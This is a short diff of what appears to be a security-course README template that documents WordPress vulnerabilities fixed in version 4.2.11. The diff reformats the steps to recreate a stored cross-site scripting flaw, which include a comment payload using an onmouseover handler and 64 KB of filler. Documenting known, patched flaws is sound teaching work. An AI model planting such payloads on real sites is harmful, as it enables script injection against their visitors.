@@ -19,9 +19,8 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.2.11
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
-
-Enter the comment below, with the 64kb of filler text (64*1024 characters). 
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+- Enter the comment below, with the 64kb of filler text (64*1024 characters). 
+- ``` <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a> ```
 
 2. (Required) Vulnerability Name or ID
   - [ ] Summary: 
